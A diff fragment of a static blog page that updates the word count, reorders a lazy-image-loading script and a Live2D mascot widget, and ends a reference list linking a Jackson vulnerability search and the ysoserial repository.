 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.<a href="https://vulmon.com/searchpage.php?q=jackson&amp;sortby=byrelevance&amp;remote=on&amp;local=on&amp;physical=on&amp;nanalyzed=on" target="_blank" rel="noopener">vuldb jackson</a></p>
 <p>2.<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p>
 <script>
@@ -1827,7 +2197,7 @@
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">41.2k</span> 字
+                <span class="white-color">44.1k</span> 字
             
 
             
@@ -2054,5 +2424,5 @@ $(function () {
         <!-- 背景动态彩带 洪卫 shw 2018  add 2019.09.15-->
         
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script></body>
+    <script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
 </html>
